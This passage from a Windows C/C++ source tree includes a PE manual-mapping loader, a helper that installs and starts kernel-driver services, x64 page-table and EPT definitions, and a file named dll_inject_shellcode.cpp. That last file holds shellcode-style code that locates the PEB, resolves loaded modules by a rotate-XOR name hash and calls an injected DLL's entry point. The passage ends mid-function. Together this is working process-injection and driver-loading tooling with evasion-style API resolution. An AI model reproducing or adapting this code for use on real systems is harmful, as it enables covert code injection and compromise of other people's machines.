void DbgMsg(char *lpszFile, int Line, char *lpszMsg, ...)
{
    va_list arg_list;
    va_start(arg_list, lpszMsg);

    int Len = _vscprintf(lpszMsg, arg_list) + MAX_PATH;

    char *lpszBuff = (char *)M_ALLOC(Len);
    if (lpszBuff == NULL)
    {
        va_end(arg_list);
        return;
    }

    char *lpszOutBuff = (char *)M_ALLOC(Len);
    if (lpszOutBuff == NULL)
    {
        M_FREE(lpszBuff);
        va_end(arg_list);
        return;
    }

    vsprintf(lpszBuff, lpszMsg, arg_list);
    va_end(arg_list);

    sprintf(lpszOutBuff, "%s(%d) : %s", GetNameFromFullPath(lpszFile), Line, lpszBuff);

    // write message into the debug output
    OutputDebugStringA(lpszOutBuff);

    HANDLE hStd = GetStdHandle(STD_OUTPUT_HANDLE);
    if (hStd != INVALID_HANDLE_VALUE)
    {
        DWORD dwWritten = 0;

        // write message into the console
        WriteFile(hStd, lpszOutBuff, lstrlen(lpszOutBuff), &dwWritten, NULL);
    }

    M_FREE(lpszBuff);
    M_FREE(lpszOutBuff);
}

#endif // DBG
//--------------------------------------------------------------------------------------
// EoF

```

`common/debug.h`:

```h

#ifdef DBG

void DbgMsg(char *lpszFile, int Line, char *lpszMsg, ...);

#else

#define DbgMsg

#endif

```

`common/ntdll_defs.h`:

```h

typedef LONG NTSTATUS; 

typedef struct _IO_STATUS_BLOCK 
{
    union 
    {
        NTSTATUS Status;
        PVOID Pointer;
    };
    
    ULONG_PTR Information;

} IO_STATUS_BLOCK, 
*PIO_STATUS_BLOCK;

typedef struct _CLIENT_ID
{
    HANDLE UniqueProcess;
    HANDLE UniqueThread;

} CLIENT_ID, 
*PCLIENT_ID;

#ifndef _NTSECAPI_

typedef struct _UNICODE_STRING 
{
    USHORT Length;
    USHORT MaximumLength;
    PWSTR Buffer;

} UNICODE_STRING, 
*PUNICODE_STRING;

#endif

typedef struct _STRING 
{
    USHORT Length;
    USHORT MaximumLength;
    PCHAR Buffer;

} ANSI_STRING, 
*PANSI_STRING;

#define OBJ_INHERIT                     0x00000002
#define OBJ_PERMANENT                   0x00000010
#define OBJ_EXCLUSIVE                   0x00000020
#define OBJ_CASE_INSENSITIVE            0x00000040
#define OBJ_OPENIF                      0x00000080
#define OBJ_OPENLINK                    0x00000100
#define OBJ_VALID_ATTRIBUTES            0x000001F2
#define OBJ_KERNEL_HANDLE               0x00000200

typedef struct _OBJECT_ATTRIBUTES
{
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;

} OBJECT_ATTRIBUTES, 
*POBJECT_ATTRIBUTES;


#define InitializeObjectAttributes(_ptr_, _name_, _attr_, _root_, _sd_)     \
                                                                            \
    {                                                                       \
        (_ptr_)->Length = sizeof(OBJECT_ATTRIBUTES);                        \
        (_ptr_)->RootDirectory = (_root_);                                  \
        (_ptr_)->Attributes = (_attr_);                                     \
        (_ptr_)->ObjectName = (_name_);                                     \
        (_ptr_)->SecurityDescriptor = (_sd_);                               \
        (_ptr_)->SecurityQualityOfService = NULL;                           \
    }


#define NT_SUCCESS(Status) ((LONG)(Status) >= 0)
#define NT_ERROR(Status)  ((ULONG)(Status) >> 30 == 3)

#define NtCurrentProcess() ((HANDLE)-1)
#define NtCurrentThread()  ((HANDLE)-2)

#define STATUS_BUFFER_OVERFLOW          0x80000005L
#define STATUS_NO_MORE_FILES            0x80000006L
#define STATUS_INFO_LENGTH_MISMATCH     0xC0000004L
#define STATUS_BUFFER_TOO_SMALL         0xC0000023L
#define STATUS_UNSUCCESSFUL             0xC0000001L
#define STATUS_IMAGE_ALREADY_LOADED     0xC000010EL

```

`common/ntdll_undocnt.h`:

```h

typedef struct _LDR_DATA_TABLE_ENTRY
{
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    ULONG Flags;
    USHORT LoadCount;
    USHORT TlsIndex;
    LIST_ENTRY HashLinks;
    PVOID SectionPointer;
    ULONG CheckSum;
    ULONG TimeDateStamp;

} LDR_DATA_TABLE_ENTRY,
*PLDR_DATA_TABLE_ENTRY;

typedef struct _PEB_LDR_DATA
{
    ULONG Length;
    BOOLEAN Initialized;
    PVOID SsHandle;
    LIST_ENTRY ModuleListLoadOrder;
    LIST_ENTRY ModuleListMemoryOrder;
    LIST_ENTRY ModuleListInitOrder;

} PEB_LDR_DATA,
*PPEB_LDR_DATA;

/************************************************************/
/*                                                          */ 
/*  Some structures for native API functions                */
/*                                                          */
/************************************************************/

typedef enum _SYSTEM_INFORMATION_CLASS 
{
    SystemBasicInformation,
    SystemProcessorInformation,
    SystemPerformanceInformation,
    SystemTimeOfDayInformation,
    SystemPathInformation,
    SystemProcessInformation,
    SystemCallCountInformation,
    SystemDeviceInformation,
    SystemProcessorPerformanceInformation,
    SystemFlagsInformation,
    SystemCallTimeInformation,
    SystemModuleInformation,
    SystemLocksInformation,
    SystemStackTraceInformation,
    SystemPagedPoolInformation,
    SystemNonPagedPoolInformation,
    SystemHandleInformation,
    SystemObjectInformation,
    SystemPageFileInformation,
    SystemVdmInstemulInformation,
    SystemVdmBopInformation,
    SystemFileCacheInformation,
    SystemPoolTagInformation,
    SystemInterruptInformation,
    SystemDpcBehaviorInformation,
    SystemFullMemoryInformation,
    SystemLoadGdiDriverInformation,
    SystemUnloadGdiDriverInformation,
    SystemTimeAdjustmentInformation,
    SystemSummaryMemoryInformation,
    SystemMirrorMemoryInformation,
    SystemPerformanceTraceInformation,
    SystemObsolete0,
    SystemExceptionInformation,
    SystemCrashDumpStateInformation,
    SystemKernelDebuggerInformation,
    SystemContextSwitchInformation,
    SystemRegistryQuotaInformation,
    SystemExtendServiceTableInformation,
    SystemPrioritySeperation,
    SystemVerifierAddDriverInformation,
    SystemVerifierRemoveDriverInformation,
    SystemProcessorIdleInformation,
    SystemLegacyDriverInformation,
    SystemCurrentTimeZoneInformation,
    SystemLookasideInformation,
    SystemTimeSlipNotification,
    SystemSessionCreate,
    SystemSessionDetach,
    SystemSessionInformation,
    SystemRangeStartInformation,
    SystemVerifierInformation,
    SystemVerifierThunkExtend,
    SystemSessionProcessInformation,
    SystemLoadGdiDriverInSystemSpace,
    SystemNumaProcessorMap,
    SystemPrefetcherInformation,
    SystemExtendedProcessInformation,
    SystemRecommendedSharedDataAlignment,
    SystemComPlusPackage,
    SystemNumaAvailableMemory,
    SystemProcessorPowerInformation,
    SystemEmulationBasicInformation,
    SystemEmulationProcessorInformation,
    SystemExtendedHandleInformation,
    SystemLostDelayedWriteInformation,
    SystemBigPoolInformation,
    SystemSessionPoolTagInformation,
    SystemSessionMappedViewInformation,
    SystemHotpatchInformation,
    SystemObjectSecurityMode,
    SystemWatchdogTimerHandler,
    SystemWatchdogTimerInformation,
    SystemLogicalProcessorInformation,
    SystemWow64SharedInformation,
    SystemRegisterFirmwareTableInformationHandler,
    SystemFirmwareTableInformation,
    SystemModuleInformationEx,
    SystemVerifierTriageInformation,
    SystemSuperfetchInformation,
    SystemMemoryListInformation,
    SystemFileCacheInformationEx,
    MaxSystemInfoClass 

} SYSTEM_INFORMATION_CLASS;

typedef struct _RTL_PROCESS_MODULE_INFORMATION
{
    HANDLE Section; 
    PVOID MappedBase;
    PVOID ImageBase;
    ULONG ImageSize;
    ULONG Flags;
    USHORT LoadOrderIndex;
    USHORT InitOrderIndex;
    USHORT LoadCount;
    USHORT OffsetToFileName;
    UCHAR  FullPathName[256];

} RTL_PROCESS_MODULE_INFORMATION,
*PRTL_PROCESS_MODULE_INFORMATION;

typedef struct _RTL_PROCESS_MODULES
{
    ULONG NumberOfModules;
    RTL_PROCESS_MODULE_INFORMATION Modules[1];

} RTL_PROCESS_MODULES,
*PRTL_PROCESS_MODULES;

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO 
{
    USHORT UniqueProcessId;
    USHORT CreatorBackTraceIndex;
    UCHAR ObjectTypeIndex;
    UCHAR HandleAttributes;
    USHORT HandleValue;
    PVOID Object;
    ULONG GrantedAccess;

} SYSTEM_HANDLE_TABLE_ENTRY_INFO, 
*PSYSTEM_HANDLE_TABLE_ENTRY_INFO;

typedef struct _SYSTEM_HANDLE_INFORMATION 
{
    ULONG NumberOfHandles;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];

} SYSTEM_HANDLE_INFORMATION, 
*PSYSTEM_HANDLE_INFORMATION;

typedef enum _KTHREAD_STATE
{
    Initialized,
    Ready,
    Running,
    Standby,
    Terminated,
    Waiting,
    Transition,
    DeferredReady,
    GateWaitObsolete,
    WaitingForProcessInSwap,
    MaximumThreadState

} KTHREAD_STATE, 
*PKTHREAD_STATE;

typedef enum _KWAIT_REASON
{
    Executive,
    FreePage,
    PageIn,
    PoolAllocation,
    DelayExecution,
    Suspended,
    UserRequest,
    WrExecutive,
    WrFreePage,
    WrPageIn,
    WrPoolAllocation,
    WrDelayExecution,
    WrSuspended,
    WrUserRequest,
    WrEventPair,
    WrQueue,
    WrLpcReceive,
    WrLpcReply,
    WrVirtualMemory,
    WrPageOut,
    WrRendezvous,
    WrKeyedEvent,
    WrTerminated,
    WrProcessInSwap,
    WrCpuRateControl,
    WrCalloutStack,
    WrKernel,
    WrResource,
    WrPushLock,
    WrMutex,
    WrQuantumEnd,
    WrDispatchInt,
    WrPreempted,
    WrYieldExecution,
    WrFastMutex,
    WrGuardedMutex,
    WrRundown,
    WrAlertByThreadId,
    WrDeferredPreempt,
    WrPhysicalFault,
    MaximumWaitReason

} KWAIT_REASON, 
*PKWAIT_REASON;

typedef struct _SYSTEM_THREAD_INFORMATION
{
    LARGE_INTEGER KernelTime;
    LARGE_INTEGER UserTime;
    LARGE_INTEGER CreateTime;
    ULONG WaitTime;
    PVOID StartAddress;
    CLIENT_ID ClientId;
    ULONG Priority;
    LONG BasePriority;
    ULONG ContextSwitches;
    KTHREAD_STATE ThreadState;
    KWAIT_REASON WaitReason;

} SYSTEM_THREAD_INFORMATION, 
*PSYSTEM_THREAD_INFORMATION;

typedef struct _SYSTEM_PROCESS_INFORMATION
{
    ULONG NextEntryOffset;
    ULONG NumberOfThreads;
    LARGE_INTEGER WorkingSetPrivateSize;
    ULONG HardFaultCount;
    ULONG NumberOfThreadsHighWatermark;
    ULONGLONG CycleTime;
    LARGE_INTEGER CreateTime;
    LARGE_INTEGER UserTime;
    LARGE_INTEGER KernelTime;
    UNICODE_STRING ImageName;
    ULONG BasePriority;
    HANDLE UniqueProcessId;
    HANDLE InheritedFromUniqueProcessId;
    ULONG HandleCount;
    ULONG SessionId;
    ULONG_PTR UniqueProcessKey;
    SIZE_T PeakVirtualSize;
    SIZE_T VirtualSize;
    ULONG PageFaultCount;
    SIZE_T PeakWorkingSetSize;
    SIZE_T WorkingSetSize;
    SIZE_T QuotaPeakPagedPoolUsage;
    SIZE_T QuotaPagedPoolUsage;
    SIZE_T QuotaPeakNonPagedPoolUsage;
    SIZE_T QuotaNonPagedPoolUsage;
    SIZE_T PagefileUsage;
    SIZE_T PeakPagefileUsage;
    SIZE_T PrivatePageCount;
    LARGE_INTEGER ReadOperationCount;
    LARGE_INTEGER WriteOperationCount;
    LARGE_INTEGER OtherOperationCount;
    LARGE_INTEGER ReadTransferCount;
    LARGE_INTEGER WriteTransferCount;
    LARGE_INTEGER OtherTransferCount;
    SYSTEM_THREAD_INFORMATION Threads[1];

} SYSTEM_PROCESS_INFORMATION, 
*PSYSTEM_PROCESS_INFORMATION;


/************************************************************/
/*                                                          */ 
/*  Prototypes for native and kernel API functions          */
/*                                                          */
/************************************************************/

typedef NTSTATUS (WINAPI * func_NtQuerySystemInformation)(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

typedef NTSTATUS (WINAPI * func_RtlGetVersion)(PRTL_OSVERSIONINFOW lpVersionInformation);

typedef enum _POOL_TYPE 
{
    NonPagedPool,
    PagedPool

} POOL_TYPE;

```

`common/peimage.cpp`:

```cpp
#include "stdafx.h"
//--------------------------------------------------------------------------------------
DWORD LdrGetProcAddress(PVOID Image, char *lpszName)
{
    PIMAGE_NT_HEADERS pHeaders = (PIMAGE_NT_HEADERS)RVATOVA(
        Image, ((PIMAGE_DOS_HEADER)Image)->e_lfanew);    

    DWORD Addr = 0;
    DWORD ExportAddr = pHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    DWORD ExportSize = pHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;

    if (ExportAddr != 0)
    {
        PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)RVATOVA(Image, ExportAddr);

        if (pExport->AddressOfFunctions == 0 ||
            pExport->AddressOfNameOrdinals == 0 ||
            pExport->AddressOfNames == 0)
        {
            // no exports by name
            return 0;
        }

        // parse module exports
        PDWORD AddrOfFunctions = (PDWORD)RVATOVA(Image, pExport->AddressOfFunctions);
        PWORD AddrOfOrdinals = (PWORD)RVATOVA(Image, pExport->AddressOfNameOrdinals);
        PDWORD AddrOfNames = (PDWORD)RVATOVA(Image, pExport->AddressOfNames);

        for (DWORD i = 0; i < pExport->NumberOfNames; i += 1)
        {
            char *lpszExport = (char *)RVATOVA(Image, AddrOfNames[i]);

            // calculate and compare hash of function
            if (!strcmp(lpszExport, lpszName))
            {
                // get exported function RVA
                Addr = AddrOfFunctions[AddrOfOrdinals[i]];
                break;
            }
        }
    }
    else
    {
        // no export table present
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: Export table is not found\n");
        return 0;
    }    

    if (Addr != 0)
    {
        // check for the forwarded export
        if (Addr > ExportAddr &&
            Addr < ExportAddr + ExportSize)
        {
            DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: Forwarded export\n");
            return 0;
        }

        return Addr;
    }

    return 0;
}
//--------------------------------------------------------------------------------------
BOOL LdrProcessRelocs(PVOID Image, PVOID NewBase)
{
    PIMAGE_NT_HEADERS pHeaders = (PIMAGE_NT_HEADERS)RVATOVA(
        Image, ((PIMAGE_DOS_HEADER)Image)->e_lfanew);

    DWORD_PTR OldBase = pHeaders->OptionalHeader.ImageBase;
    DWORD RelocAddr = pHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
    DWORD RelocSize = pHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;    

    if (RelocAddr == 0)
    {
        // no image relocations are present but it's ok
        return TRUE;
    }

    DWORD Size = 0;
    PIMAGE_BASE_RELOCATION pRelocation = (PIMAGE_BASE_RELOCATION)RVATOVA(Image, RelocAddr);    
        
    while (RelocSize > Size && pRelocation->SizeOfBlock)
    {            
        DWORD Num = (pRelocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
        PWORD Rel = (PWORD)RVATOVA(pRelocation, sizeof(IMAGE_BASE_RELOCATION));

        for (DWORD i = 0; i < Num; i += 1)
        {
            if (Rel[i] > 0)
            {
                WORD Type = (Rel[i] & 0xF000) >> 12;

                // check for supporting type
                if (Type != IMAGE_REL_BASED_DIR64 &&
                    Type != IMAGE_REL_BASED_ABSOLUTE)
                {
                    DbgMsg(__FILE__, __LINE__, __FUNCTION__ "() ERROR: Unknown relocation type %d\n", Type);
                    return FALSE;
                }
                
                if (Type == IMAGE_REL_BASED_DIR64)
                {
                    // fix relocation value
                    *(PDWORD64)(RVATOVA(
                        Image, 
                        pRelocation->VirtualAddress + (Rel[i] & 0x0FFF))) += (DWORD64)NewBase - OldBase;
                }                
            }
        }

        // go to the next block
        pRelocation = (PIMAGE_BASE_RELOCATION)RVATOVA(pRelocation, pRelocation->SizeOfBlock);
        Size += pRelocation->SizeOfBlock;            
    }

    return TRUE;
}
//--------------------------------------------------------------------------------------
BOOL LdrMapImage(PVOID Data, DWORD dwDataSize, PVOID *pImage, PDWORD pdwImageSize)
{    
    PIMAGE_NT_HEADERS pHeaders = (PIMAGE_NT_HEADERS)RVATOVA(
        Data, ((PIMAGE_DOS_HEADER)Data)->e_lfanew);

    PIMAGE_SECTION_HEADER pSection = (PIMAGE_SECTION_HEADER)RVATOVA(
        &pHeaders->OptionalHeader, pHeaders->FileHeader.SizeOfOptionalHeader);

    DWORD dwImageSize = pHeaders->OptionalHeader.SizeOfImage;    

    // allocate image memory
    PVOID Image = M_ALLOC(dwImageSize);
    if (Image)
    {          
        // copy image headers
        ZeroMemory(Image, dwImageSize);
        CopyMemory(Image, Data, pHeaders->OptionalHeader.SizeOfHeaders);

        // copy image sections        
        for (DWORD i = 0; i < pHeaders->FileHeader.NumberOfSections; i += 1)
        {
            memcpy(
                RVATOVA(Image, pSection->VirtualAddress),
                RVATOVA(Data, pSection->PointerToRawData),
                min(pSection->SizeOfRawData, pSection->Misc.VirtualSize)
            );

            pSection += 1;
        }    

        *pImage = Image;
        *pdwImageSize = dwImageSize;

        return TRUE;
    }
    else
    {
        DbgMsg(__FILE__, __LINE__, "M_ALLOC() ERROR %d\n\n", GetLastError());
    }

    return FALSE;
}
//--------------------------------------------------------------------------------------
// EoF

```

`common/peimage.h`:

```h

DWORD LdrGetProcAddress(PVOID Image, char *lpszName);
BOOL LdrProcessRelocs(PVOID Image, PVOID NewBase);
BOOL LdrMapImage(PVOID Data, DWORD dwDataSize, PVOID *Image, PDWORD pdwImageSize);

```

`common/service.cpp`:

```cpp
#include "stdafx.h"
//--------------------------------------------------------------------------------------
BOOL ServiceStart(char *lpszName, char *lpszPath, BOOL bCreate)
{
    BOOL bRet = FALSE;

    SC_HANDLE hManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (hManager)
    {
        SC_HANDLE hService = NULL;

        if (bCreate)
        {
            // create service for kernel-mode driver
            hService = CreateService(
                hManager, lpszName, lpszName, SERVICE_START | DELETE | SERVICE_STOP,
                SERVICE_KERNEL_DRIVER, SERVICE_SYSTEM_START, SERVICE_ERROR_IGNORE,
                lpszPath, NULL, NULL, NULL, NULL, NULL
            );
            if (hService == NULL)
            {
                if (GetLastError() == ERROR_SERVICE_EXISTS)
                {
                    // open existing service
                    if ((hService = OpenService(hManager, lpszName, SERVICE_START | DELETE | SERVICE_STOP)) == NULL)
                    {
                        DbgMsg(__FILE__, __LINE__, "OpenService() ERROR %d\n", GetLastError());
                    }
                }
                else
                {
                    DbgMsg(__FILE__, __LINE__, "CreateService() ERROR %d\n", GetLastError());
                }
            }
        }        
        else
        {
            // open existing service
            hService = OpenService(hManager, lpszName, SERVICE_START | DELETE | SERVICE_STOP);
        }

        if (hService)
        {
            // start service
            if (StartService(hService, 0, NULL))
            {
                bRet = TRUE;
            }
            else
            {
                if (GetLastError() == ERROR_SERVICE_ALREADY_RUNNING)
                {
                    // service is already started
                    bRet = TRUE;
                }
                else
                {
                    DbgMsg(__FILE__, __LINE__, "StartService() ERROR %d\n", GetLastError());
                }
            }

            CloseServiceHandle(hService);
        }

        CloseServiceHandle(hManager);
    }
    else
    {
        DbgMsg(__FILE__, __LINE__, "OpenSCManager() ERROR %d\n", GetLastError());
    }

    return bRet;
}
//--------------------------------------------------------------------------------------
BOOL ServiceStop(char *lpszName)
{
    BOOL bRet = FALSE;

    SC_HANDLE hManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (hManager)
    {
        // open existing service
        SC_HANDLE hService = OpenService(hManager, lpszName, SERVICE_ALL_ACCESS);
        if (hService)
        {
            SERVICE_STATUS Status;

            // stop service
            if (ControlService(hService, SERVICE_CONTROL_STOP, &Status))
            {
                bRet = TRUE;
            }
            else
            {
                DbgMsg(__FILE__, __LINE__, "ControlService() ERROR %d\n", GetLastError());
            }

            CloseServiceHandle(hService);
        }
        else
        {
            DbgMsg(__FILE__, __LINE__, "OpenService() ERROR %d\n", GetLastError());
        }

        CloseServiceHandle(hManager);
    }
    else
    {
        DbgMsg(__FILE__, __LINE__, "OpenSCManager() ERROR %d\n", GetLastError());
    }

    return bRet;
}
//--------------------------------------------------------------------------------------
BOOL ServiceRemove(char *lpszName)
{
    BOOL bRet = FALSE;

    SC_HANDLE hManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (hManager)
    {
        // open existing service
        SC_HANDLE hService = OpenService(hManager, lpszName, SERVICE_ALL_ACCESS);
        if (hService)
        {
            // delete service
            if (DeleteService(hService))
            {
                bRet = TRUE;
            }
            else
            {
                DbgMsg(__FILE__, __LINE__, "DeleteService() ERROR %d\n", GetLastError());
            }

            CloseServiceHandle(hService);
        }
        else
        {
            DbgMsg(__FILE__, __LINE__, "OpenService() ERROR %d\n", GetLastError());
        }

        CloseServiceHandle(hManager);
    }
    else
    {
        DbgMsg(__FILE__, __LINE__, "OpenSCManager() ERROR %d\n", GetLastError());
    }

    return bRet;
}
//--------------------------------------------------------------------------------------
// EoF

```

`common/service.h`:

```h

BOOL ServiceStart(char *lpszName, char *lpszPath, BOOL bCreate);
BOOL ServiceStop(char *lpszName);
BOOL ServiceRemove(char *lpszName);

```

`common/virtmem.h`:

```h

#pragma pack(1)

//
// Page Map Level 4 Offset (PML4) and
// Page Directory Pointer Table (PDPE) entries 4K & 2M
//
typedef union 
{
    struct 
    {
        DWORD64 Present : 1;                // 0 = Not present in memory, 1 = Present in memory
        DWORD64 ReadWrite : 1;              // 0 = Read-Only, 1= Read/Write
        DWORD64 UserSupervisor : 1;         // 0 = Supervisor, 1=User
        DWORD64 WriteThrough : 1;           // 0 = Write-Back caching, 1=Write-Through caching
        DWORD64 CacheDisabled : 1;          // 0 = Cached, 1=Non-Cached
        DWORD64 Accessed : 1;               // 0 = Not accessed, 1 = Accessed (set by CPU)
        DWORD64 Reserved : 1;               // Reserved
        DWORD64 MustBeZero : 2;             // Must Be Zero
        DWORD64 Available : 3;              // Available for use by system software
        DWORD64 PageTableBaseAddress : 40;  // Page Table Base Address
        DWORD64 AvabilableHigh : 11;        // Available for use by system software
        DWORD64 Nx : 1;                     // No Execute bit

    } Bits;

    DWORD64 Uint64;

} X64_PAGE_MAP_AND_DIRECTORY_POINTER_2MB_4K;

//
// Page Directory Entry 4K
//
typedef union 
{
    struct 
    {
        DWORD64 Present : 1;                // 0 = Not present in memory, 1 = Present in memory
        DWORD64 ReadWrite : 1;              // 0 = Read-Only, 1= Read/Write
        DWORD64 UserSupervisor : 1;         // 0 = Supervisor, 1=User
        DWORD64 WriteThrough : 1;           // 0 = Write-Back caching, 1=Write-Through caching
        DWORD64 CacheDisabled : 1;          // 0 = Cached, 1=Non-Cached
        DWORD64 Accessed : 1;               // 0 = Not accessed, 1 = Accessed (set by CPU)
        DWORD64 MustBeZero : 3;             // Must Be Zero
        DWORD64 Available : 3;              // Available for use by system software
        DWORD64 PageTableBaseAddress : 40;  // Page Table Base Address
        DWORD64 AvabilableHigh : 11;        // Available for use by system software
        DWORD64 Nx : 1;                     // No Execute bit

    } Bits;

    DWORD64 Uint64;

} X64_PAGE_DIRECTORY_ENTRY_4K;

//
// Page Table Entry 4K
//
typedef union 
{
    struct 
    {
        DWORD64 Present : 1;                // 0 = Not present in memory, 1 = Present in memory
        DWORD64 ReadWrite : 1;              // 0 = Read-Only, 1= Read/Write
        DWORD64 UserSupervisor : 1;         // 0 = Supervisor, 1=User
        DWORD64 WriteThrough : 1;           // 0 = Write-Back caching, 1=Write-Through caching
        DWORD64 CacheDisabled : 1;          // 0 = Cached, 1=Non-Cached
        DWORD64 Accessed : 1;               // 0 = Not accessed, 1 = Accessed (set by CPU)
        DWORD64 Dirty : 1;                  // 0 = Not Dirty, 1 = written by processor on access to page
        DWORD64 PAT : 1;                    // 0 = Ignore Page Attribute Table 
        DWORD64 Global : 1;                 // 0 = Not global page, 1 = global page TLB not cleared on CR3 write
        DWORD64 Available : 3;              // Available for use by system software
        DWORD64 PageTableBaseAddress : 40;  // Page Table Base Address
        DWORD64 AvabilableHigh : 11;        // Available for use by system software
        DWORD64 Nx : 1;                     // 0 = Execute Code, 1 = No Code Execution

    } Bits;
    
    DWORD64 Uint64;

} X64_PAGE_TABLE_ENTRY_4K;

//
// Page Table Entry 2M
//
typedef union 
{
    struct 
    {
        DWORD64 Present : 1;                // 0 = Not present in memory, 1 = Present in memory
        DWORD64 ReadWrite : 1;              // 0 = Read-Only, 1= Read/Write
        DWORD64 UserSupervisor : 1;         // 0 = Supervisor, 1=User
        DWORD64 WriteThrough : 1;           // 0 = Write-Back caching, 1=Write-Through caching
        DWORD64 CacheDisabled : 1;          // 0 = Cached, 1=Non-Cached
        DWORD64 Accessed : 1;               // 0 = Not accessed, 1 = Accessed (set by CPU)
        DWORD64 Dirty : 1;                  // 0 = Not Dirty, 1 = written by processor on access to page
        DWORD64 MustBe1 : 1;                // Must be 1 
        DWORD64 Global : 1;                 // 0 = Not global page, 1 = global page TLB not cleared on CR3 write
        DWORD64 Available : 3;              // Available for use by system software
        DWORD64 PAT : 1;                    //
        DWORD64 MustBeZero : 8;             // Must be zero;
        DWORD64 PageTableBaseAddress : 31;  // Page Table Base Address
        DWORD64 AvabilableHigh : 11;        // Available for use by system software
        DWORD64 Nx : 1;                     // 0 = Execute Code, 1 = No Code Execution

    } Bits;
    
    DWORD64 Uint64;

} X64_PAGE_TABLE_ENTRY_2M;

#pragma pack()

#define PFN_TO_PAGE(_val_) (((DWORD64)(_val_)) << PAGE_SHIFT)
#define PAGE_TO_PFN(_val_) (((DWORD64)(_val_)) >> PAGE_SHIFT)

// get MPL4 address from CR3 register value
#define PML4_ADDRESS(_val_) ((_val_) & 0xfffffffffffff000)

// get address translation indexes from virtual address
#define PML4_INDEX(_addr_) (((DWORD64)(_addr_) >> 39) & 0x1ff)
#define PDPT_INDEX(_addr_) (((DWORD64)(_addr_) >> 30) & 0x1ff)
#define PDE_INDEX(_addr_) (((DWORD64)(_addr_) >> 21) & 0x1ff)
#define PTE_INDEX(_addr_) (((DWORD64)(_addr_) >> 12) & 0x1ff)

// get address translation indexes to virtual address
#define PML4_ADDR(_index_) ((_index_) << 39)
#define PDPT_ADDR(_index_) ((_index_) << 30)
#define PDE_ADDR(_index_) ((_index_) << 21)
#define PTE_ADDR(_index_) ((_index_) << 12)

#define PAGE_OFFSET_4K(_addr_) ((DWORD64)(_addr_) & 0xfff)
#define PAGE_OFFSET_2M(_addr_) ((DWORD64)(_addr_) & 0x1fffff)
#define PAGE_OFFSET_1G(_addr_) ((DWORD64)(_addr_) & 0x3fffffff)

// PS flag of PDPTE and PDE
#define PDPTE_PDE_PS 0x80

// EPT present bit
#define EPT_PRESENT(_val_) (((_val_) & 7) != 0)

// PTE bits
#define PTE_PRESENT 0x1
#define PTE_RW      0x2
#define PTE_GLOBAL  0x100

// EPT permission flags
#define EPT_R(_val_) (((_val_) & 1) == 1)
#define EPT_W(_val_) (((_val_) & 2) == 2)
#define EPT_X(_val_) (((_val_) & 4) == 4)

```

`dll_inject_shellcode.cpp`:

```cpp
#include "stdafx.h"

typedef BOOL (WINAPI * DLL_MAIN)(
    PVOID hinstDLL,
    DWORD fdwReason,
    PVOID lpvReserved
);
//--------------------------------------------------------------------------------------
DWORD WINAPI dll_inject_Entry(PDLL_INJECT_STRUCT Struct)
{
    // check if payload present
    PVOID ModuleBase = Struct->ModuleBase;
    if (ModuleBase)
    {        
        // load imports
        if (dll_inject_ProcessImports(ModuleBase))
        {
            PIMAGE_NT_HEADERS pHeaders = (PIMAGE_NT_HEADERS)
                RVATOVA(ModuleBase, ((PIMAGE_DOS_HEADER)ModuleBase)->e_lfanew);  

            if (pHeaders->OptionalHeader.AddressOfEntryPoint != 0)
            {
                DLL_MAIN DllMain = (DLL_MAIN)
                    RVATOVA(ModuleBase, pHeaders->OptionalHeader.AddressOfEntryPoint);

                // call DLL entry point
                DllMain(ModuleBase, DLL_PROCESS_ATTACH, NULL);
            }            
        }
    }    

    return 0;
}
//--------------------------------------------------------------------------------------
DWORD WINAPI dll_inject_CalcHash(char *lpszString)
{
    DWORD Hash = 0;
    char *lpszChar = lpszString;

    while (*lpszChar) 
    {
        Hash = ((Hash << 7) & (DWORD)-1) | (Hash >> (32 - 7));
        Hash = Hash ^ *lpszChar;

        lpszChar += 1;
    }

    return Hash;
}
//--------------------------------------------------------------------------------------
PVOID WINAPI dll_inject_GetModuleAddressByHash(DWORD ModuleHash)
{
    PUCHAR Peb = NULL;

#ifdef _X86_

    Peb = (PUCHAR)__readfsdword(0x30);

#else _AMD64_

    PUCHAR Teb = (PUCHAR)__readgsqword(0x30);
    if (Teb)
    {
        Peb = *(PUCHAR *)(Teb + 0x60);
    }    

#endif    

    if (Peb == NULL)
    {
        // process is not initialized properly
        return NULL;
    }

    // obtain address of first entry in loader's table
    PPEB_LDR_DATA LdrData = *(PPEB_LDR_DATA *)(Peb + DLL_INJECT_PEB_LDR_TABLE_OFFSET);
    PLIST_ENTRY Head = &LdrData->ModuleListLoadOrder;
    PLIST_ENTRY Entry = Head->Flink;

    // parse loader table entries
    while (Entry != Head)
    {
        char szBaseDllName[MAX_PATH];        
        PLDR_DATA_TABLE_ENTRY LdrData = CONTAINING_RECORD(Entry, LDR_DATA_TABLE_ENTRY, InLoadOrderModuleList);                
        WORD NameLength = LdrData->BaseDllName.Length / sizeof(WCHAR);

        for (WORD i = 0; i < NameLength; i += 1)
        {
            // copy module name into ANSI string
            char Chr = (char)LdrData->BaseDllName.Buffer[i];

